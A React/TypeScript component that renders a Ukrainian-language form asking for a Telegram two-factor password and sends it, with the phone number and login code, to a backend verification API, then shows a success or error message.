import { useState } from 'react';
import { verifyCode } from '../api/api';

function EnterPassword({ phone, code }: { phone: string; code: string }) {
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState('');
  const [error, setError] = useState('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    setStatus('');
    setLoading(true);

    try {
      const res = await verifyCode(phone, code, password);
      if (res.status === 'authorized') {
        setStatus(`✅ Успішно авторизовано як @${res.username || 'користувач'}`);
      } else {
        setError('Невідомий статус');
      }
    } catch (err) {
      setError('Невірний пароль або помилка');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div>
      <h2>Введіть 2FA-пароль Telegram</h2>
      <form onSubmit={handleSubmit}>
        <input
          type="password"
          placeholder="Ваш пароль"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          required
        />
        <button type="submit" disabled={loading}>
          {loading ? 'Перевірка...' : 'Підтвердити'}
        </button>
      </form>

      {status && <p style={{ color: 'green' }}>{status}</p>}
      {error && <p style={{ color: 'red' }}>{error}</p>}
    </div>
  );
}

export default EnterPassword;
